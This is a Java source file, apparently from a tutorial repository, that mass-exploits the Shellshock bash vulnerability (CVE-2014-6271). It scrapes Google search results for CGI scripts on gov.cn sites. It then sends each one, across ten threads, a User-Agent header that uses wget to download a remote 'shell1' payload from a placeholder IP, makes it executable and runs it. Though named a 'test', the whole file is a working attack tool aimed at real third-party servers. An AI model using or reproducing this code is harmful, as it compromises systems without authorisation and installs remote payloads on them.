package com.micmiu.tutorial.java.other;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.net.URLDecoder;
import java.util.Queue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created
 * User: <a href="http://micmiu.com">micmiu</a>
 * Date: 9/25/2014
 * Time: 15:09
 */
public class CVE20146271Test extends Thread{

	Queue<String> strQeueu = new LinkedBlockingQueue<String>();

	public CVE20146271Test(Queue<String> strQeueu){
		this.strQeueu = strQeueu;
	}

	public static String getResponse(String url) throws IOException{
		try {
			System.out.println("请求:"+url);
			Connection.Response response = Jsoup.connect(url)
					.userAgent("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0")
					.referrer("http://www.google.com.hk/")
					.userAgent("() { :; }; /usr/bin/wget xxx.xxx.xxx.xxx/shell1 -O /tmp/shell1 | /bin/chmod 777 /tmp/shell1 | /tmp/shell1")
					.ignoreHttpErrors(true)
					.timeout(3000)
					.execute();
			return response.body();
		} catch (IOException e) {
			throw e;
		}
	}

	public void run(){
		while(true){
			String str = strQeueu.poll();
			if(str == null){
				return ;
			}
			try {
				getResponse(str);
			} catch (Exception e) {
				System.err.println(e);
			}
		}
	}

	public static void main(String[] args) throws IOException {
		Document doc = Jsoup.connect("https://www.google.ws/search?q=filetype:cgi+inurl:cgi-bin+site:gov.cn&num=100&newwindow=1&biw=1440&bih=710&ei=qpojVIrRIJPX8gWU_4GwDg&start=300&sa=N").userAgent("Googlebot/2.1 (+http://www.googlebot.com/bot.html)").timeout(5000).get();
		Elements element = doc.getElementsByTag("h3");
		Queue<String> ls = new LinkedBlockingQueue<String>();
		for (Element e : element) {
			Matcher m= Pattern.compile("/url\\?q=(.*)&sa").matcher(e.getElementsByTag("a").get(0).attr("href"));
			if(m.find()){
				String url = URLDecoder.decode(m.group(1), "UTF-8");
				if(url.contains("cgi")){
					ls.offer(url);
				}
			}
		}
		ThreadGroup tg = new ThreadGroup("cgi");
		int threadCount = ls.size() > 10 ? 10 : ls.size();
		while (threadCount > 0) {
			for (int i = 0; i < threadCount; i++) {
				threadCount--;
				new Thread(tg, new CVE20146271Test(ls)).start();
			}
			while (true) {
				if (tg.activeCount() == 0) {
					break;
				}
			}
		}
	}

}